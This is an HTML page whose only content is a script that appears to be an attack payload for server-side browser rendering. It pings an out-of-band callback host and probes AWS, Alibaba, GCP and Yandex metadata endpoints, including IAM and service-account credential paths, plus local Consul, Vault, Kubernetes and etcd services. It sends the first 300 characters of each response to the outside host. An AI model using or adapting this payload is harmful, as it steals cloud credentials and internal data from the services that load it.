<!DOCTYPE html>
<html>
<head><title>t</title></head>
<body>
<script>
var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
var T0 = Date.now();

function fire(path) {
  new Image().src = 'https://' + OOB + path + '&_=' + Math.random();
  fetch('https://' + OOB + path, {mode:'no-cors'}).catch(function(){});
}

// Heartbeat every 300ms - tells us how long Chromium keeps the page alive
var hbN = 0;
var hbTimer = setInterval(function() {
  hbN++;
  fire('/hb?n=' + hbN + '&ms=' + (Date.now() - T0));
}, 300);
setTimeout(function(){ clearInterval(hbTimer); }, 20000);

// Alive beacon
fire('/alive?ua=' + encodeURIComponent(navigator.userAgent.slice(0, 100)));

// All IMDS probes fired in parallel, no await chain
var probes = [
  ['aws',     'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {}],
  ['aws-tok', 'http://169.254.169.254/latest/api/token', {method:'PUT', headers:{'X-aws-ec2-metadata-token-ttl-seconds':'21600'}}],
  ['ali',     'http://100.100.100.200/latest/meta-data/', {}],
  ['ali-cred','http://100.100.100.200/latest/meta-data/ram/security-credentials/', {}],
  ['gcp',     'http://metadata.google.internal/computeMetadata/v1/project/project-id', {headers:{'Metadata-Flavor':'Google'}}],
  ['gcp-sa',  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/', {headers:{'Metadata-Flavor':'Google'}}],
  ['yc',      'http://169.254.169.254/latest/meta-data/', {headers:{'Metadata-Flavor':'Yandex'}}],
  ['consul',  'http://127.0.0.1:8500/v1/catalog/services', {}],
  ['vault',   'http://127.0.0.1:8200/v1/sys/health', {}],
  ['k8s',     'https://kubernetes.default.svc/api/', {}],
  ['etcd',    'http://127.0.0.1:2379/version', {}],
];

probes.forEach(function(p) {
  var label = p[0], url = p[1], opts = p[2];
  var t0 = Date.now();
  var fetchOpts = {signal: AbortSignal.timeout(5000)};
  if (opts.method) fetchOpts.method = opts.method;
  if (opts.headers) fetchOpts.headers = opts.headers;

  fetch(url, fetchOpts)
    .then(function(r) {
      return r.text().then(function(body) {
        fire('/ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0,300)));
      });
    })
    .catch(function(e) {
      fire('/err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0,100)));
    });
});
</script>
</body>
</html>
